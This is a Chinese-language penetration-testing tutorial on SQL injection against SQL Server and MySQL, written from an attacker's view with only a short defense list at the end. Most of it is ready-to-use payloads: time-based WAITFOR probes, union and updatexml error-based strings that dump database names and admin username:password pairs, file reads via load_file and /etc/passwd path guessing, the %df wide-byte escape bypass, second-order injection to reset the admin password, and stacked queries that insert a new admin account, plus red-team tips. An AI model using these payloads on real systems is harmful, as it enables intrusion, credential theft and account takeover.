# SQL注入

**SQL注入**（英语：SQL injection），也称**SQL注入**或**SQL注码**，是发生于应用程序与数据库层的[安全漏洞](https://zh.wikipedia.org/wiki/安全漏洞)。简而言之，是在输入的字符串之中注入[SQL](https://zh.wikipedia.org/wiki/SQL)指令，在设计不良的[程序](https://zh.wikipedia.org/wiki/计算机程序)当中忽略了字符检查，那么这些注入进去的恶意指令就会被[数据库](https://zh.wikipedia.org/wiki/資料庫)[服务器](https://zh.wikipedia.org/wiki/伺服器)误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。

白话来说就是：未对用户输入数据做过滤或过滤规则不严谨，将用户输入数据当作代码来执行。

## 思维导图

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huanSQL%E6%B3%A8%E5%85%A5.png)

## 注入类型

根据使用的技巧，SQL注入类型可分为：

- 盲注
  * 布尔盲注：只能从应用返回中推断语句执行后的布尔值
  * 时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断
- 报错注入：应用会显示全部或者部分的报错信息
- 堆叠注入：有的应用可以加入`;`后一次执行多条语句

根据不同数据库服务器，注入语句也有所不同。



## SQL Server

WAITFOR是SQL Server中Transact-SQL提供的一个流程控制语句。它的作用就是等待特定时间后，继续执行后续语句。它包含一个参数DELAY，用来指定等待的时间。

```sql
# 用法：上述语句表示等待5秒再执行操作。
WAITFOR DELAY '0:0:5'

# 示例：
select 1 WAITFOR DELAY '0:0:5'
```

这里是在centos7上通过docker部署的SQL Server

```
docker run -e "ACCEPT_EULA=Y" -e "SA_PASSWORD=Qwer1234" -p 1433:1433 --name ssql  -d mcr.microsoft.com/mssql/server:2017-latest
```

通过工具或配置代码，即可连接。

使用命令查看SQL Server版本

```sql
select @@version

Microsoft SQL Server 2017 (RTM-CU25) (KB5003830) - 14.0.3401.7 (X64) 
	Jun 25 2021 14:02:48 
	Copyright (C) 2017 Microsoft Corporation
	Developer Edition (64-bit) on Linux (Ubuntu 16.04.7 LTS)
```



### SQL注入常用函数

#### SUBSTRING

字符截断函数：SUBSTRING(expression, start, length)  

其中：

* expression：需要被截断的字符，可以是字符，二进制，文本，`ntext`或图像表达式。
* start：从第几位开始截断
* length：需要是一个正整数，否则会报错，用来指定总共需要截断的字符长度

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210817211405.png)

构造注入语句，判断是否存在注入点

```
SELECT name
FROM sys.databases
where database_id = 1
IF (SUBSTRING(DB_NAME(), 1, 1) = 'm') WAITFOR delay '0:0:3';


SELECT name
FROM sys.databases
where database_id = 1
IF (SUBSTRING(DB_NAME(), 1, 1) = CHAR(109)) WAITFOR delay '0:0:3';
```

#### ASCII码半截法

```
SELECT name
FROM sys.databases
where database_id = 1
IF ASCII(SUBSTRING(DB_NAME(), 1, 1)) > 30
WAITFOR DELAY '0:0:3';
```

通过判断字符的ASCII可以枚举该字段的所有值。

也可以构造子查询语句来实现SQL注入。

```
SELECT name
FROM sys.databases
where database_id = 1
IF (SUBSTRING((SELECT name
FROM sys.databases
where database_id = 2), 3, 1)) = 'm'
WAITFOR DELAY '0:0:3';
```

id为2的值参考上图中的结果。



### 位移注入

这种注入方式适合在找到表但是找不到字段的情况下使用。

这种注入方式需要联合两张表，所以该注入方式也是联合查询的一种。

#### 原理

在SQL注入中，甚至在Linux系统中，`*`表示所有。比如：

```
SELECT * FROM sys.databases;
```

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210817220310.png)

`*`在这里表示返回所有字段的所有值。



### 回显注入

#### DNS无回显注入

DNS在解析的时候会留下日志，利用这个属性，可以读取多级域名的解析日志，来获取相关信息。

将带有查询的语句，发起DNS请求，通过DNS请求查询到值，组合成三级域名，在NS服务器DNS的日志中显示出来。

一般使用**布尔型**和延时型盲注判断是否存在注入点，但是这两种查询都很慢，dnslog查询因为是直接显示数据，所以通过dnslog查询的方式来判断注入点，效率高很多。

[**ceye.io**](http://ceye.io)是免费的dnslog注入平台，提供很多相关payload。



## MySQL

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huanMySQL%E6%B3%A8%E5%85%A5.png)

### 报错返回

在疑似注入点，输入正确的内容，再故意输入错误内容，对比两次返回的信息，如果返回内容存在较大差异，那么极有可能存在注入点。如果返回内容是有或无，而并无较大差异，那么就可能不存在注入点。

### Union注入

猜解列名数量（字段个数）

```
# x是猜测的字段的个数，如果超过4个数之后报错，那么字段数就是4个
order by x
# 那么就可以用union来查询相关字段信息
union select 1, 2, 3, 4
# 然后可以通过猜测各个数字对应的字段名，将字段名与数字进行替换
union select user, version...来猜测对应的字段信息来进行渗透
```

> information_achema是MySQL中自带的一张表，包含该数据库中所有的表和字段等相关信息。

```
# 接着就可以通过information_achema获取相关的表名、字段及数据信息
union select 1, tables, 3, 4 from information_schema.schemata;
# 最后获取到管理员账号密码或其他相关信息。
union select username, password, 3, 4 where table_name='admin' and table_schema='xxx';
```

> 低版本mysql只能靠猜表名来获取表名和字段信息，因为低版本mysql没有information_schema表。

### 常用函数

* database()：获取当前数据库名
* version()：获取当前MySQL版本
* user()：获取当前MySQL用户
* group_concat()：将括号中的所有参数拼接成一个字符串
* substr(str,start,length)：截取str字符串中从start开始，长度为length的子串

### 读取文件

```
# 读取文件
load_file()

# 导出文件
into file或into dumpfile
```

#### 如何获取文件路径？

##### 利用报错显示

```
Warning: require(/http/www.mywakavLee.cn/bootstrap/../vendor/autoload.php): failed to open stream: No such file or directory in /http/www.mywakavLee.cn/bootstrap/autoload.php on line 17
```

> 百度搜索语法：intext:warning inurl:php

##### 利用遗留文件

![img](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan/20210502232826.png)

##### 利用漏洞报错

> 在线搜索：搭建平台（中间件）+ 爆路径。
>
> 可根据不同平台的搭建方式和相关组件，获取到对应的漏洞信息并尝试对其进行渗透。

##### 平台默认配置文件

暴力猜测文件路径

```
/etc/passwd
/etc/hosts
......
```

### 魔术引号

magic_quotes_gpc：魔术引号开关，开启后，输入的特殊字符（单引号、双引号等）都将被加上反斜杠（\）进行转义。

可以尝试对注入语句进行编码，就不再存在单引号（其他特殊字符）的问题，然后将编码后的内容提交，也有可能注入成功。

其中SQL语句干扰符号：`'`, `"`,`%`,`)`等，需要实际情况实际分析

### HTTP请求相关

- GET POST方法
- COOKIE
- REQUEST（全部接收）
- HEADER：可以尝试进行HTTP头部注入
- SERVER（'HTTP_USER_AGENT'）获取请求方的操作系统、IP地址等
- ......

> 一般情况下，我们并不知道对方网站（APP）的参数接收方式（单个接收、POST接收等），所以需要尝试使用各种方法来渗透。

### 查询方式及报错盲注

当进行SQL注入时，有很多注入会出现无回显的情况，原因之一可能是SQL语句查询方式的问题导致，这时，我们需要用到相关的报错信息或**盲注**进行后续操作，同时，作为手工注入时，提前了解或预知其SQL语句大概写法，也能更好的选择对应的注入语句。

我们可以通过增删改查、排序等等查询方式，梳理与网站应用的关系，猜测网站或应用中注入点产生的地方以及和SQL的对应方式。

### SQL注入常用语句

```mysql
# 未对单引号和百分号做过滤
selcet * from tabel where name like '%dmi*'; # admin
127.0.0.1:8000/?name=test' or 1=1--+;
select * from table where name = 'test' or 1=1--+';
select * from table where name = 'test' and 1=1--+';
# 万能方法
'")

127.0.0.1:8000/?name=test' and '1'='2
select * from table where name = 'test' and '1'='2'

# 猜测字段个数，如果--+注释不成功，可以换成#试试
127.0.0.1:8000/?name=test' order by 3--+
127.0.0.1:8000/?name=test' order by 3#

username=x' or (select 1 from ( select count(*), concat((select (select (select concat(0x7e, database(), 0x7e))) from information_schema.tables limit 0, 1) floor(rand(0) * 2)) x from information_schema.tables group by x) a) or '

# 爆数据库版本信息
?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

# 链接用户
?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)

# 链接数据库
?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)

# 爆库
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)

# 爆表
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)

# 爆字段
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)

# 爆字段内容
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
```

### 宽字节注入

php编码为utf-8，而mysql的编码设置为`set names 'gbk'`或`set character_set_client=gbk`，php中编码为gbk，函数执行添加的是ascii编码，mysql默认字符集是gbk等宽字节字符集。

这样配置会引发编码转换从而导致的注入漏洞(一个gbk编码汉字，占用2个字节，一个utf-8编码的汉字，占用3个字节）。

所以，宽字节注入一般会采用GBK字符编码和网页URL编码两种方式。

反注入的方式之一，就是对特殊字符进行转义处理，比如加上反斜杠。因此，可以考虑在单引号的前面加上%df，而\的url编码是%5c，id传入之后，就会在`'`前加一个\，由于采用的URL编码，所以产生的效果是**%df%5c%27**，从而注入成功。

为什么加一个%df就可以了呢？因为这是mysql的一种特性，GBK是多字节编码，它认为两个字节就代表一个汉字。字符反斜线“\” 的ASCII码值是5C，占用一个字节，GBK编码方式可以将反斜线“\”转换为一个服务器数据库不识别的汉字（变成了一个“運”），即在5C前面拼接组合一个字符0xdf，从而’逃逸了出来。

因此只要第一个字节和%5c结合是一个汉字，就可以成功绕过了，当第一个字节的**ascii码大于128**，就可以了。

> GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。

### 二次注入

> 二次注入相关：CMS二次注入

#### 第一步：插入恶意数据

第一次进行数据库插入的时候，仅仅对其中的特殊字符进行了转移，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。

#### 第二步：引用恶意数据

在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的校验和处理，这样就会造成SQL的二次注入。

![img](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan/20210504151430.png)

比如，我注册某个网站的账号，我填入如下信息。

```
register\?pwd=test&name=admin'
```

当'被转义后，得到的是`admin\'`，在存入数据库之前，需要将转义字符\去掉，然后再存入数据库，就变成了`admin'`那么我再次调用的时候，就可以做很多操作。

```
?name=admin' and 1=1--+
或
?name=admin' and 1=2--+
或
?name=admin' or 1=1--+
```

在数据库查询中，就是之前的熟悉注入语句。

```
select name from user where name='admin' or 1=1--+'
```

如果用户表是下面这样的：

```
admin   admin
user_a  aaaaa
user_b  bbbbb
...
admin'  test
```

那么我们就可以做一些事情

```
update\?pwd=1234?name=admin'--+
```

对应的SQL语句就是

```
update user set pwd='1234' where user='admin'--+';
```

再次查看用户表就会发现，更改的并不是我们注册的admin'账号。

```
admin   1234
user_a  aaaaa
user_b  bbbbb
...
admin'  test
```

而是修改的admin账号，这样，就会发生很危险的事情。当然，在实际的渗透过程中，修改用户密码是很容易被发现的（因为对方会发现登陆不上），如果是在HVV的过程中，作为红方，最好的方法是查询出管理员或其他相关人员的账号进行登陆。

以上仅仅是演示其中的一种效果，比如，我们还可以这样

```
register\?pwd=test&name=admin' union select * from user;--+
```

那么，再次查询时，SQL语句对应如下：

```
select pwd, user from user where pwd='test' and user='admin' union select * from user;--+'
```

还有其他更多的思路，比如有些情况需要填写用户其他信息，比如手机号、邮箱号等，这些都可以成为潜在的注入点，这也验证了行业内经典语录：**一切用户输入都不可靠。**



### DNSLOG带外注入

工具：https://github.com/ADOOO/DnslogSqlinj

DNSLOG注入解决了盲注不能回显数据，注入效率低下的问题。

### 堆叠查询注入

Stacked injections（堆叠注入），多条语句一起执行。

```
query/?id=1'; insert into users (name, pwd) values ('test', 'test') --+
```

在数据库中就变成了

```
select * from users where id='1'; insert into users (name, pwd) values ('test', 'test') --+'
```

比如注入需要管理员账号密码，管理员密码都是加密的，无法被猜解出来，那么可以通过堆叠注入的方式，执行多条语句，插入新的管理员用户信息，用户名和密码都是自定义的，这样同样可以以管理员身份实现相关操作。

以上只是堆叠注入的应用场景之一，还有很多其他用处，按实际情况进行操作。



## JSON注入

json注入同sql注入，在参数输入点可以用上面的SQL注入思路来进行渗透。



## 防御

* 魔术引号、百分号过滤
* 关键字过滤：union、select等，或者将特定关键字使用replace进行替换等。
* WAF防护：大部分都是绕过和过滤关键字，可能存在一些关键字字典或者规则或语句等，一旦触发则注入失败。
* 需要结合实际情况进行注入以及防护。



## 参考链接

* [12种报错注入+万能语句](http://events.jianshu.io/p/bc35f8dd4f7c)
* [freebuf盲注测试高级技巧](https://www.freebuf.com/articles/web/30841.html)

